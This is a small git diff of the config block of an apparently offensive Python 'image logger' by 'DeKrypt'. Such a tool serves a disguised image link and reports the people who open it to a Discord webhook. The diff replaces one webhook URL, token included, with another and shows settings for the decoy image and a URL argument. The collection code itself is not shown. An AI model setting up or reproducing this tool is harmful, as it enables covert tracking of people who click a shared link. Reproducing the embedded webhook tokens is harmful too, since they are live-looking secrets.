@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1279502523144867951/-jRmlTVt_peMv93eIrvXIIRotQC63n2BF7s5d06__TsIGVcmpgylMi-p6a8A1h88C9nP",
+    "webhook": "https://discord.com/api/webhooks/1288676619044651051/m9v-1V-QZJ8PoW1Awc5CsA0nkWTJ0HLgqUy6fL2U0tdtRYoYIIRnk78xcuCW8MahKBc_",
     "image": "https://images.hdqwalls.com/wallpapers/water-through-rocks-4k-kl.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
